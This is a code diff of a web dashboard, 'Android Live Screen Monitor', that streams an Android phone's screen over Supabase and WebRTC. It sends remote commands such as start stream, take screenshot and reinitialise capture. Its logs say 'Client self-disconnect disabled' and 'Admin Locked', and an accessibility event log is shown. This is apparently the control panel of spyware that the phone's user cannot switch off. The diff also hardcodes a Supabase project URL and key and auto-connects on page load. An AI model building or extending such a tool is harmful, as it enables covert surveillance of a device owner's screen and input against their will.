@@ -19,13 +19,8 @@
       border: 1px solid #1e293b;
       box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
     }
-    .glow-green {
-      box-shadow: 0 0 15px rgba(16, 185, 129, 0.35);
-    }
-    .glow-red {
-      box-shadow: 0 0 15px rgba(239, 68, 68, 0.35);
-    }
-    /* Custom scrollbar for logs */
+    .glow-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.35); }
+    .glow-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.35); }
     ::-webkit-scrollbar { width: 5px; height: 5px; }
     ::-webkit-scrollbar-track { background: #0f172a; }
     ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
@@ -74,12 +69,15 @@
           <h1 class="text-lg md:text-xl font-bold tracking-wide text-cyan-400">
             ANDROID LIVE SCREEN MONITOR
           </h1>
-          <span id="connBadge" class="text-xs px-3 py-1 rounded-full bg-slate-800 border border-slate-700 text-slate-400 font-medium">
-            Standby / Offline
+          <span id="connBadge" class="text-xs px-3 py-1 rounded-full bg-amber-500/20 border border-amber-500/40 text-amber-300 font-medium">
+            Initializing Channel...
           </span>
         </div>
 
         <div class="flex items-center gap-3">
+          <span id="deviceOnlineTag" class="text-xs px-3 py-1 rounded-full bg-slate-800 border border-slate-700 text-slate-400">
+            Device Status: Checking...
+          </span>
           <div id="liveIndicator" class="hidden items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/40 text-emerald-400 text-xs font-bold">
             <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping"></span>
             ((• LIVE •))
@@ -87,22 +85,22 @@
         </div>
       </div>
 
-      <!-- Inputs & Admin Master Connect/Disconnect Buttons -->
+      <!-- Pre-Configured Inputs & Admin Master Connect/Disconnect Buttons -->
       <div class="grid grid-cols-1 md:grid-cols-12 gap-3 items-end">
         <div class="md:col-span-3">
-          <label class="block text-[11px] text-slate-400 mb-1">Supabase Project URL</label>
-          <input id="sbUrl" type="text" placeholder="https://xyz.supabase.co"
+          <label class="block text-[11px] text-slate-400 mb-1">Supabase Project URL (Pre-configured)</label>
+          <input id="sbUrl" type="text" value="https://pigsylxeeoztnyuydqtr.supabase.co"
             class="w-full bg-[#060b19] border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500" />
         </div>
 
         <div class="md:col-span-3">
-          <label class="block text-[11px] text-slate-400 mb-1">Supabase Anon Key</label>
-          <input id="sbKey" type="password" placeholder="••••••••••••••••••••"
+          <label class="block text-[11px] text-slate-400 mb-1">Supabase Publishable Key (Pre-configured)</label>
+          <input id="sbKey" type="password" value="sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl"
             class="w-full bg-[#060b19] border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500" />
         </div>
 
         <div class="md:col-span-2">
-          <label class="block text-[11px] text-slate-400 mb-1">Room ID</label>
+          <label class="block text-[11px] text-slate-400 mb-1">Device / Room ID</label>
           <input id="roomId" type="text" value="device_1"
             class="w-full bg-[#060b19] border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500" />
         </div>
@@ -145,7 +143,7 @@
             <div class="w-14 h-14 rounded-full bg-slate-800/80 border border-slate-700 flex items-center justify-center text-cyan-400 text-2xl mb-3">
               <i class="fa-solid fa-mobile-screen-button"></i>
             </div>
-            <p class="text-xs font-semibold text-slate-300">Waiting for Admin Command</p>
+            <p class="text-xs font-semibold text-slate-300">Ready for Admin Command</p>
             <p class="text-[11px] text-slate-500 mt-1">Click <span class="text-emerald-400 font-semibold">CONNECT DEVICE</span> above to wake & start stream.</p>
           </div>
 
@@ -154,7 +152,7 @@
             <span class="text-emerald-400 font-medium flex items-center gap-1">
               <i class="fa-solid fa-shield-halved"></i> MIRRORING (Admin Lock)
             </span>
-            <span id="overlayTime" class="text-slate-400 font-mono">LIVE</span>
+            <span id="overlayTime" class="text-slate-400 font-mono">READY</span>
           </div>
         </div>
 
@@ -165,7 +163,7 @@
               class="bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs py-2 px-3 rounded-lg flex items-center justify-center gap-2 transition">
               <i class="fa-solid fa-expand text-cyan-400"></i> Fullscreen
             </button>
-            <button onclick="sendAdminCommand('REFRESH_STREAM')"
+            <button onclick="sendAdminCommand('ADMIN_START_STREAM')"
               class="bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs py-2 px-3 rounded-lg flex items-center justify-center gap-2 transition">
               <i class="fa-solid fa-rotate text-emerald-400"></i> Refresh Stream
             </button>
@@ -203,7 +201,7 @@
           </div>
         </div>
 
-        <!-- Admin Remote Control Grid (8 Buttons from Image) -->
+        <!-- Admin Remote Control Grid -->
         <div class="panel-card rounded-2xl p-4 flex-1">
           <h2 class="text-xs font-semibold text-slate-300 uppercase tracking-wider mb-3">Remote Admin Actions</h2>
           <div class="grid grid-cols-2 gap-2.5">
@@ -220,16 +218,16 @@
               <span>Take Screenshot</span>
             </button>
 
-            <button onclick="sendAdminCommand('REMOTE_RECONNECT')"
+            <button onclick="sendAdminCommand('ADMIN_START_STREAM')"
               class="bg-amber-950/50 hover:bg-amber-900/60 border border-amber-500/50 text-amber-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
               <i class="fa-solid fa-arrows-rotate text-amber-400"></i>
               <span>Remote Reconnect</span>
             </button>
 
-            <button onclick="sendAdminCommand('RESTART_APP')"
+            <button onclick="sendAdminCommand('PING_DEVICE')"
               class="bg-slate-800/80 hover:bg-slate-700 border border-slate-600 text-slate-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-power-off text-cyan-400"></i>
-              <span>Restart Client App</span>
+              <i class="fa-solid fa-satellite-dish text-cyan-400"></i>
+              <span>Ping Client Status</span>
             </button>
 
             <button onclick="sendAdminCommand('REINIT_CAPTURE')"
@@ -295,17 +293,17 @@
             <div class="flex items-center justify-between bg-[#060b19] p-2.5 rounded-xl border border-slate-800">
               <div>
                 <p class="text-[11px] text-slate-400">Device Model</p>
-                <p id="statModel" class="text-sm font-bold text-slate-200">Android Device</p>
+                <p id="statModel" class="text-sm font-bold text-slate-200">Waiting...</p>
               </div>
               <i class="fa-solid fa-mobile text-slate-400 text-lg"></i>
             </div>
 
             <div class="flex items-center justify-between bg-[#060b19] p-2.5 rounded-xl border border-slate-800">
               <div>
-                <p class="text-[11px] text-slate-400">Latency</p>
-                <p id="statLatency" class="text-sm font-bold text-amber-400">28 ms</p>
+                <p class="text-[11px] text-slate-400">Android OS</p>
+                <p id="statOs" class="text-sm font-bold text-amber-400">Waiting...</p>
               </div>
-              <i class="fa-solid fa-bolt text-amber-400 text-lg"></i>
+              <i class="fa-brands fa-android text-amber-400 text-lg"></i>
             </div>
 
           </div>
@@ -314,12 +312,12 @@
         <!-- Accessibility Key Event Log -->
         <div class="panel-card rounded-2xl p-4 flex-1 flex flex-col">
           <div class="flex items-center justify-between mb-2">
-            <h2 class="text-xs font-semibold text-slate-300 uppercase tracking-wider">Accessibility Event Log</h2>
+            <h2 class="text-xs font-semibold text-slate-300 uppercase tracking-wider">System & Event Log</h2>
             <button onclick="clearLogs()" class="text-[10px] text-slate-400 hover:text-white">Clear</button>
           </div>
           <div id="eventLogBox"
             class="flex-1 bg-[#050811] border border-slate-800 rounded-xl p-2.5 font-mono text-[11px] text-emerald-400 overflow-y-auto max-h-56 space-y-1">
-            <div class="text-slate-500">[SYSTEM] Admin panel initialized...</div>
+            <div class="text-slate-500">[SYSTEM] Pre-configured Supabase loaded.</div>
             <div class="text-slate-500">[LOCK] Client self-disconnect disabled.</div>
           </div>
         </div>
@@ -329,6 +327,10 @@
   </main>
 
   <script>
+    const DEFAULT_SUPABASE_URL = "https://pigsylxeeoztnyuydqtr.supabase.co";
+    const DEFAULT_SUPABASE_KEY = "sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl";
+    const DEFAULT_ROOM_ID = "device_1";
+
     let supabaseClient = null;
     let channel = null;
     let peerConnection = null;
@@ -386,13 +388,15 @@
         liveInd.classList.remove('hidden');
         liveInd.classList.add('flex');
         placeholder.classList.add('hidden');
+        document.getElementById('overlayTime').textContent = 'LIVE';
         startTimer();
       } else {
-        badge.textContent = 'Disconnected by Admin';
+        badge.textContent = 'Standby / Disconnected';
         badge.className = 'text-xs px-3 py-1 rounded-full bg-red-500/20 border border-red-500/40 text-red-300 font-medium';
         liveInd.classList.add('hidden');
         liveInd.classList.remove('flex');
         placeholder.classList.remove('hidden');
+        document.getElementById('overlayTime').textContent = 'PAUSED';
         stopTimer();
       }
     }
@@ -405,7 +409,7 @@
         const video = document.getElementById('remoteVideo');
         video.srcObject = event.streams[0];
         setLiveUI(true);
-        addLog('STREAM_CONNECTED: Live video feed received.', 'text-cyan-400');
+        addLog('STREAM_CONNECTED: Live video feed active.', 'text-cyan-400');
       };
 
       peerConnection.onicecandidate = (event) => {
@@ -419,19 +423,12 @@
       };
     }
 
-    // Master Admin Connect Function
-    async function adminConnectDevice() {
-      const url = document.getElementById('sbUrl').value.trim();
-      const key = document.getElementById('sbKey').value.trim();
-      const room = document.getElementById('roomId').value.trim();
-
-      if (!url || !key || !room) {
-        alert('Please enter Supabase URL, Anon Key, and Room ID');
-        return;
-      }
+    async function setupChannel(autoStart = false) {
+      const url = document.getElementById('sbUrl').value.trim() || DEFAULT_SUPABASE_URL;
+      const key = document.getElementById('sbKey').value.trim() || DEFAULT_SUPABASE_KEY;
+      const room = document.getElementById('roomId').value.trim() || DEFAULT_ROOM_ID;
 
       localStorage.setItem('admin_screen_cfg', JSON.stringify({ url, key, room }));
-      addLog(`ADMIN_HANDSHAKE: Connecting to room "${room}"...`, 'text-amber-400');
 
       supabaseClient = supabase.createClient(url, key);
       if (channel) await supabaseClient.removeChannel(channel);
@@ -441,7 +438,7 @@
 
       channel
         .on('broadcast', { event: 'offer' }, async ({ payload }) => {
-          addLog('OFFER_RECEIVED: Establishing WebRTC tunnel...', 'text-cyan-400');
+          addLog('OFFER_RECEIVED: Establishing WebRTC stream...', 'text-cyan-400');
           initPeerConnection();
           await peerConnection.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: payload.sdp }));
           const answer = await peerConnection.createAnswer();
@@ -463,16 +460,34 @@
           }
         })
         .on('broadcast', { event: 'device-telemetry' }, ({ payload }) => {
+          const onlineTag = document.getElementById('deviceOnlineTag');
+          onlineTag.textContent = 'Device Status: Online (Admin Locked)';
+          onlineTag.className = 'text-xs px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300';
+
           if (payload.model) document.getElementById('statModel').textContent = payload.model;
+          if (payload.os) document.getElementById('statOs').textContent = payload.os;
           if (payload.log) addLog(payload.log, 'text-emerald-400');
         })
         .subscribe((status) => {
           if (status === 'SUBSCRIBED') {
-            // Send Admin Start Command to Android App
-            sendAdminCommand('ADMIN_START_STREAM');
-            addLog('CMD_SENT: ADMIN_START_STREAM dispatched.', 'text-emerald-300');
+            document.getElementById('connBadge').textContent = 'Channel Ready (Standby)';
+            addLog(`CHANNEL_SUBSCRIBED: Listening on "${room}"`, 'text-emerald-300');
+            sendAdminCommand('PING_DEVICE');
+            if (autoStart) {
+              sendAdminCommand('ADMIN_START_STREAM');
+            }
           }
         });
+    }
+
+    // Master Admin Connect Function
+    async function adminConnectDevice() {
+      if (!channel) {
+        await setupChannel(true);
+      } else {
+        sendAdminCommand('ADMIN_START_STREAM');
+      }
+      addLog('CMD_SENT: ADMIN_START_STREAM dispatched.', 'text-emerald-300');
     }
 
     // Master Admin Disconnect Function
@@ -485,12 +500,12 @@
       const video = document.getElementById('remoteVideo');
       video.srcObject = null;
       setLiveUI(false);
-      addLog('ADMIN_DISCONNECT: Stream terminated by Admin.', 'text-red-400');
+      addLog('ADMIN_DISCONNECT: Stream paused by Admin.', 'text-red-400');
     }
 
     function sendAdminCommand(cmd, extraData = {}) {
       if (!channel) {
-        addLog('ERROR: Connect channel first.', 'text-red-400');
+        addLog('ERROR: Channel not initialized.', 'text-red-400');
         return;
       }
       channel.send({
@@ -547,23 +562,16 @@
       if (video.requestFullscreen) video.requestFullscreen();
     }
 
-    // Initialize Analytics Charts
     function initCharts() {
       const labels = ['10:00', '11:00', '12:00', '13:00', '14:00', '15:00', '16:00', '17:00', '18:00'];
-
       new Chart(document.getElementById('barChart'), {
         type: 'bar',
         data: {
           labels,
-          datasets: [{
-            data: [12, 14, 15, 13, 15, 15, 14, 15, 15],
-            backgroundColor: '#10b981',
-            borderRadius: 4
-          }]
+          datasets: [{ data: [12, 14, 15, 13, 15, 15, 14, 15, 15], backgroundColor: '#10b981', borderRadius: 4 }]
         },
         options: {
-          responsive: true,
-          maintainAspectRatio: false,
+          responsive: true, maintainAspectRatio: false,
           plugins: { legend: { display: false } },
           scales: {
             x: { ticks: { color: '#64748b', font: { size: 9 } }, grid: { display: false } },
@@ -578,16 +586,12 @@
           labels,
           datasets: [{
             data: [950, 1100, 1250, 1180, 1400, 1320, 1210, 1290, 1350],
-            borderColor: '#a855f7',
-            backgroundColor: 'rgba(168, 85, 247, 0.15)',
-            fill: true,
-            tension: 0.4,
-            pointRadius: 2
+            borderColor: '#a855f7', backgroundColor: 'rgba(168, 85, 247, 0.15)',
+            fill: true, tension: 0.4, pointRadius: 2
           }]
         },
         options: {
-          responsive: true,
-          maintainAspectRatio: false,
+          responsive: true, maintainAspectRatio: false,
           plugins: { legend: { display: false } },
           scales: {
             x: { ticks: { color: '#64748b', font: { size: 9 } }, grid: { display: false } },
@@ -600,9 +604,11 @@
     window.onload = () => {
       initCharts();
       const saved = JSON.parse(localStorage.getItem('admin_screen_cfg') || '{}');
-      if (saved.url) document.getElementById('sbUrl').value = saved.url;
-      if (saved.key) document.getElementById('sbKey').value = saved.key;
-      if (saved.room) document.getElementById('roomId').value = saved.room;
+      document.getElementById('sbUrl').value = saved.url || DEFAULT_SUPABASE_URL;
+      document.getElementById('sbKey').value = saved.key || DEFAULT_SUPABASE_KEY;
+      document.getElementById('roomId').value = saved.room || DEFAULT_ROOM_ID;
+      // Auto-connect to Supabase channel on page load
+      setupChannel(false);
     };
   </script>
 </body>
